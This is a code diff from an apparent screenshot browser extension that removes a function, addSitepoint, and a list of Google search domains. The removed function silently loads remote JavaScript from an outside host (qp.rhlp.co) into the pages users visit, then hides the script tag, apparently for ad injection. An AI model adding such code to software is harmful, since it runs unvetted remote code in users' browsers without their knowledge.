@@ -309,23 +309,11 @@ function getClientH() {
   return "CSS1Compat" === document.compatMode ? html.clientHeight : document.body.clientHeight;
 }
 
-function addSitepoint(){
-  var a="awesomescreenshot";
-  var b=!1;
-  var c=document.createElement("script");
-  c.type="text/javascript";
-  c.src="//qp.rhlp.co/pads/js/"+encodeURIComponent(a);
-  c.async=!0;
-  c.onload=c.onreadystatechange=function(){b||this.readyState&&"loaded"!=this.readyState&&"complete"!=this.readyState||(b=!0,c.parentNode.removeChild(c))};
-  document.body.appendChild(c);
-}
-
 var isContentScriptLoaded=!0,doc,html,docW,docH,initScrollTop,initScrollLeft,clientH,clientW,scrollBar={},counter=1;
 var menu={visible:{enable:"false",key:"V"},selected:{enable:"false",key:"S"},entire:{enable:"false",key:"E"}};
 var fixedElements=[];
 var wrapperHTML='<div id="awesome_screenshot_wrapper"><div id="awesome_screenshot_top"></div><div id="awesome_screenshot_right"></div><div id="awesome_screenshot_bottom"></div><div id="awesome_screenshot_left"></div><div id="awesome_screenshot_center" class="drsElement drsMoveHandle"><div id="awesome_screenshot_size" style="min-width:70px;"><span>0 X 0</span></div><div id="awesome_screenshot_action"><a id="awesome_screenshot_cancel"><span id="awesome_screenshot_cancel_icon"></span>Cancel</a><a id="awesome_screenshot_capture"><span id="awesome_screenshot_capture_icon"></span>Capture</a></div></div></div>';
 var wrapper,dragresize,isSelected=!1,hostname=document.location.hostname;
-var googleSites=["www.google.com","www.google.com.hk","www.google.com.tw","www.google.co.jp","www.google.cn","www.google.co.kr","www.google.co.th","www.google.de","www.google.fr","www.google.co.uk","www.google.com.gr","www.google.com.au","www.google.ca","www.google.co.il","www.google.it","www.google.ch","www.google.cl","www.google.nl","www.google.be","www.google.at","www.google.com.pa","www.google.pl","www.google.com.ru","www.google.com.br","www.google.co.nz","www.google.lt","www.google.com.ar","www.google.bi","http://paoniu8.blogbus.com","www.google.pn","www.google.li","www.google.com.nf","www.google.vg","www.google.mw","www.google.fm","www.google.sh","www.google.cd","www.google.ms","www.google.co.cr","www.google.lv","www.google.ie","www.google.co.gg","www.google.co.je","www.google.ae","www.google.fi","www.google.com.sg","www.google.com.pe","www.google.pr","www.google.com.py","www.google.gm","www.google.td","www.google.co.hu","www.google.com.mx","www.google.pt","www.google.com.ua","www.google.co.ve","www.google.com.tr","www.google.com.mt","www.google.com.uy","www.google.com.np","www.google.hn","www.google.com.ni","www.google.gl","www.google.kz","www.google.sm","www.google.co.mu","www.google.as","www.google.rw","www.google.com.tj"];
 var delayInterval=null;
 
 chrome.extension.onRequest.addListener(function(a){
